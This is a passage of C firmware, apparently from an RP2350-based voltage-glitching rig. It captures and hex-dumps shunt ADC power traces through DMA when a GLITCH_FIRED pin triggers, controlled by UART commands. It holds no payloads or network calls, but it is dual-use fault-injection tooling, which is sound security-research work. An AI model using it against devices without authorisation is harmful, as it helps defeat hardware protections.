    // Find min/max
    uint16_t amin = 4095, amax = 0;
    for (uint32_t i = 0; i < adc_count; i++) {
        if (adc_buf[i] < amin) amin = adc_buf[i];
        if (adc_buf[i] > amax) amax = adc_buf[i];
    }
    uart_cli_printf("  ADC range: %u-%u (%.2fV-%.2fV)\r\n",
                    amin, amax,
                    amin * 3.3f / 4095.0f, amax * 3.3f / 4095.0f);

    // Raw sample dump — hex dump format, 16-bit LE samples, 16 bytes (8 samples) per line
    uint32_t total_bytes = adc_count * 2;
    uart_cli_printf("  RAW_START %lu %lu\r\n", adc_count, sample_us);  // sample_count sample_window_us
    uint8_t *p = (uint8_t *)adc_buf;
    for (uint32_t i = 0; i < total_bytes; i += 16) {
        uart_cli_printf("%06X:", i);
        for (uint32_t j = i; j < i + 16 && j < total_bytes; j++) {
            uart_cli_printf(" %02X", p[j]);
        }
        uart_cli_send("\r\n");
    }
    uart_cli_send("  RAW_END\r\n");

    swd_deinit();
    adc_select_input(ADC_POWER_CHAN);

    uart_cli_send("\r\n=== TIMING COMPLETE ===\r\n");
}

// ============================================================
// Background ADC trace capture (DMA + GLITCH_FIRED interrupt)
//
// TRACE START [samples] [pre%]  — start DMA circular capture
// TRACE STATUS                  — check state
// TRACE DUMP                    — output captured buffer
// TRACE STOP                    — abort
//
// Flow: DMA runs ADC into circular buffer continuously.
// GLITCH_FIRED rising edge ISR snapshots DMA position,
// then reconfigures DMA for exactly post_samples more transfers.
// DMA stops itself when count hits zero. No CPU involvement.
// ============================================================

#define TRACE_BUF_SAMPLES 4096
#define TRACE_BUF_BYTES   (TRACE_BUF_SAMPLES * 2)
#define TRACE_BUF_LOG2    13  // log2(8192)

static uint16_t __attribute__((aligned(TRACE_BUF_BYTES))) trace_buf[TRACE_BUF_SAMPLES];

typedef enum {
    TRACE_IDLE = 0,
    TRACE_RUNNING,      // DMA active, waiting for trigger
    TRACE_TRIGGERED,    // Trigger fired, DMA counting down post_samples
    TRACE_COMPLETE,     // DMA finished, buffer ready for dump
} trace_state_t;

static volatile trace_state_t trace_state = TRACE_IDLE;
static volatile uint32_t trace_trig_sample = 0;  // buffer index at trigger
static int trace_dma_chan = -1;
static uint32_t trace_post_samples = 0;
static uint32_t trace_total_samples = 0;
static uint32_t trace_pre_pct = 25;
static uint32_t trace_clkdiv = 0;

void trace_set_clkdiv(uint32_t div) {
    trace_clkdiv = div;
}

static uint64_t trace_start_us = 0;
static uint64_t trace_trig_us = 0;
static uint64_t trace_end_us = 0;

// GLITCH_FIRED rising edge ISR — trigger fired
static void trace_glitch_fired_isr(uint gpio, uint32_t events) {
    if (gpio != PIN_GLITCH_FIRED || trace_state != TRACE_RUNNING) return;

    // Snapshot DMA write position = trigger point in circular buffer
    uint32_t write_addr = (uint32_t)dma_channel_hw_addr(trace_dma_chan)->write_addr;
    trace_trig_sample = (write_addr - (uint32_t)trace_buf) / 2;
    trace_trig_us = time_us_64();

    // Abort DMA (register-level, ISR-safe), then restart with post_samples count.
    // Can't modify running counter on RP2350 — must abort+restart.
    dma_hw->abort = (1u << trace_dma_chan);
    while (dma_hw->abort & (1u << trace_dma_chan)) tight_loop_contents();

    // Drain any residual ADC FIFO samples
    while (!adc_fifo_is_empty()) adc_fifo_get();

    // Restart DMA: write continues from trigger point, post_samples transfers.
    // Writing al1_transfer_count_trig sets count AND triggers the channel.
    dma_hw->ch[trace_dma_chan].write_addr = write_addr;
    dma_hw->ch[trace_dma_chan].al1_transfer_count_trig = trace_post_samples;

    trace_state = TRACE_TRIGGERED;

    // Disable this interrupt — one-shot
    gpio_set_irq_enabled(PIN_GLITCH_FIRED, GPIO_IRQ_EDGE_RISE, false);
}

// DMA completion ISR — post_samples done
static void trace_dma_isr(void) {
    dma_channel_acknowledge_irq0(trace_dma_chan);
    adc_run(false);
    trace_end_us = time_us_64();
    trace_state = TRACE_COMPLETE;
}

void trace_start(uint32_t samples, uint32_t pre_pct_arg) {
    if (trace_state == TRACE_RUNNING || trace_state == TRACE_TRIGGERED) {
        uart_cli_send("ERROR: Trace already running (TRACE STOP first)\r\n");
        return;
    }

    if (samples == 0) samples = TRACE_BUF_SAMPLES;
    if (samples > TRACE_BUF_SAMPLES) samples = TRACE_BUF_SAMPLES;
    if (pre_pct_arg == 0) pre_pct_arg = 25;
    if (pre_pct_arg > 90) pre_pct_arg = 90;

    trace_total_samples = samples;
    trace_pre_pct = pre_pct_arg;
    trace_post_samples = samples - (samples * pre_pct_arg) / 100;
    trace_state = TRACE_IDLE;
    trace_trig_sample = 0;

    // Init ADC free-running with DMA
    adc_init();
    adc_gpio_init(ADC_SHUNT_PIN);
    adc_select_input(ADC_SHUNT_CHAN);
    adc_fifo_setup(true, true, 1, false, false);
    adc_set_clkdiv(trace_clkdiv);  // 0=~500ksps (~2us), 100=~5ksps (~200us)

    // Claim DMA channel
    trace_dma_chan = dma_claim_unused_channel(true);
    dma_channel_config cfg = dma_channel_get_default_config(trace_dma_chan);
    channel_config_set_transfer_data_size(&cfg, DMA_SIZE_16);
    channel_config_set_read_increment(&cfg, false);
    channel_config_set_write_increment(&cfg, true);
    channel_config_set_ring(&cfg, true, TRACE_BUF_LOG2);
    channel_config_set_dreq(&cfg, DREQ_ADC);

    dma_channel_configure(trace_dma_chan, &cfg,
        trace_buf,          // write
        &adc_hw->fifo,      // read
        0xFFFFFFFF,         // circular until ISR sets post count
        false);

    // Set up DMA completion interrupt (fires when transfer_count hits 0)
    dma_channel_set_irq0_enabled(trace_dma_chan, true);
    irq_set_exclusive_handler(DMA_IRQ_0, trace_dma_isr);
    irq_set_enabled(DMA_IRQ_0, true);

    // Set up GP12 rising edge interrupt (GLITCH_FIRED) via shared dispatcher
    gpio_irq_register(PIN_GLITCH_FIRED, GPIO_IRQ_EDGE_RISE, trace_glitch_fired_isr);

    // Start DMA then ADC
    dma_channel_start(trace_dma_chan);
    adc_run(true);
    trace_start_us = time_us_64();
    trace_state = TRACE_RUNNING;

    uart_cli_printf("OK: Trace started (%lu samples, %lu%% pre-trigger, %lu post)\r\n",
                    samples, pre_pct_arg, trace_post_samples);
    uart_cli_printf("  Waiting for trigger (GP%d rising edge)...\r\n", PIN_GLITCH_FIRED);
}

void trace_stop(void) {
    if (trace_state == TRACE_IDLE) {
        uart_cli_send("Trace not running\r\n");
        return;
    }
    adc_run(false);
    if (trace_dma_chan >= 0) {
        dma_channel_abort(trace_dma_chan);
        dma_channel_set_irq0_enabled(trace_dma_chan, false);
        dma_channel_unclaim(trace_dma_chan);
        trace_dma_chan = -1;
    }
    irq_set_enabled(DMA_IRQ_0, false);
    gpio_irq_unregister(PIN_GLITCH_FIRED, trace_glitch_fired_isr);
    adc_fifo_drain();
    adc_fifo_setup(false, false, 0, false, false);
    adc_select_input(ADC_POWER_CHAN);
    trace_state = TRACE_IDLE;
    uart_cli_send("OK: Trace reset\r\n");
}

void trace_status(void) {
    const char *state_str;
    switch (trace_state) {
        case TRACE_IDLE:      state_str = "IDLE"; break;
        case TRACE_RUNNING:   state_str = "RUNNING (waiting for trigger)"; break;
        case TRACE_TRIGGERED: state_str = "TRIGGERED (capturing post samples)"; break;
        case TRACE_COMPLETE:  state_str = "COMPLETE (ready for TRACE DUMP)"; break;
        default:              state_str = "UNKNOWN"; break;
    }
    uart_cli_printf("Trace: %s\r\n", state_str);
    if (trace_state >= TRACE_TRIGGERED) {
        uart_cli_printf("  Trigger at buffer index %lu\r\n", trace_trig_sample);
    }
    if (trace_state == TRACE_COMPLETE) {
        uint32_t total_us = (uint32_t)(trace_end_us - trace_start_us);
        uart_cli_printf("  Total time: %luus\r\n", total_us);
    }
}

void trace_dump(void) {
    if (trace_state != TRACE_COMPLETE) {
        uart_cli_printf("ERROR: Trace not complete (state: %d)\r\n", trace_state);
        return;
    }

    uint32_t pre_count = (trace_total_samples * trace_pre_pct) / 100;
    uint32_t post_count = trace_post_samples;

    // Check if buffer wrapped enough for full pre-trigger
    // DMA ran for at least (trigger_time - start_time) at ~500ksps
    uint32_t capture_us = (uint32_t)(trace_trig_us - trace_start_us);
    uint32_t est_pre_available = capture_us / 2;  // ~2us/sample
    if (pre_count > est_pre_available)
        pre_count = est_pre_available;
    if (pre_count > TRACE_BUF_SAMPLES - post_count)
        pre_count = TRACE_BUF_SAMPLES - post_count;

    uint32_t out_total = pre_count + post_count;
    uint32_t total_us = (uint32_t)(trace_end_us - trace_start_us);

    uart_cli_printf("Captured %lu samples (%lu pre + %lu post trigger)\r\n",
                    out_total, pre_count, post_count);
    uart_cli_printf("Trigger at sample %lu, ~2us/sample\r\n", pre_count);

    // Extract window from circular buffer — unwrap in-place to out_buf
    // Post-trigger data ends at: (trig_sample + post_count) & mask
    // Pre-trigger data starts at: (trig_sample - pre_count) & mask
    static uint16_t out_buf[32768];
    uint32_t mask = TRACE_BUF_SAMPLES - 1;
    for (uint32_t i = 0; i < out_total; i++) {
        uint32_t src = (trace_trig_sample - pre_count + i) & mask;
        out_buf[i] = trace_buf[src];
    }

    // Hex dump
    uint32_t total_bytes = out_total * 2;
    uart_cli_printf("  RAW_START %lu %lu %lu\r\n", out_total, total_us, pre_count);
    uint8_t *p = (uint8_t *)out_buf;
    for (uint32_t i = 0; i < total_bytes; i += 16) {
        uart_cli_printf("%06X:", i);
        for (uint32_t j = i; j < i + 16 && j < total_bytes; j++) {
            uart_cli_printf(" %02X", p[j]);
        }
        uart_cli_send("\r\n");
    }
    uart_cli_send("  RAW_END\r\n");

    uart_cli_send("=== TRACE COMPLETE ===\r\n");
}
